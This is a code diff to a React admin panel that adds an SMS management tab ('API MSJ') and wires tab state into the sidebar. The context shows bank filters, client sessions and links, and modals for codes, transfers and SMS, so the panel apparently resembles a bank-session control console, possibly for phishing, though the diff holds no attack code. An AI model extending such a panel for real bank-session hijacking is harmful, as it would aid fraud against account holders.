@@ -9,6 +9,7 @@ import Sidebar from '@/components/admin/Sidebar';
 import AccessTable from '@/components/admin/AccessTable';
 import UserManagement from '@/components/admin/UserManagement';
 import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
+import SmsManagement from '@/components/admin/SmsManagement';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
 import { Session, ScreenType } from '@shared/schema';
 import { Button } from '@/components/ui/button';
@@ -18,7 +19,7 @@ import { nanoid } from 'nanoid';
 export default function AdminPanel() {
   const { toast } = useToast();
   const [activeBank, setActiveBank] = useState<string>("todos");
-  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered'>('current');
+  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'sms'>('current');
   const { user, logoutMutation } = useAuth();
   const [activeModal, setActiveModal] = useState<string | null>(null);
   const [clientLink, setClientLink] = useState<string>('');
@@ -465,7 +466,12 @@ export default function AdminPanel() {
   return (
     <div className="flex w-full h-screen overflow-hidden">
       {/* Sidebar */}
-      <Sidebar />
+      <Sidebar 
+        activeTab={activeTab}
+        onTabChange={(tab) => setActiveTab(tab as 'current' | 'saved' | 'users' | 'registered' | 'sms')}
+        isAdmin={isAdmin}
+        isSuperAdmin={isSuperAdmin}
+      />
 
       {/* Main Content */}
       <div className="flex-1 bg-[#121212] text-white flex flex-col h-screen overflow-hidden">
@@ -607,6 +613,14 @@ export default function AdminPanel() {
                 </div>
               </>
             )}
+            <div 
+              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'sms' 
+                ? 'border-[#00aaff] text-[#00aaff]' 
+                : 'border-transparent hover:text-gray-300'}`}
+              onClick={() => setActiveTab('sms')}
+            >
+              API MSJ
+            </div>
           </div>
           
           <div className="flex items-center space-x-2">
@@ -630,6 +644,8 @@ export default function AdminPanel() {
           <UserManagement />
         ) : activeTab === 'registered' && isSuperAdmin ? (
           <RegisteredUsersManagement />
+        ) : activeTab === 'sms' ? (
+          <SmsManagement />
         ) : (
           <AccessTable 
             sessions={sessions}
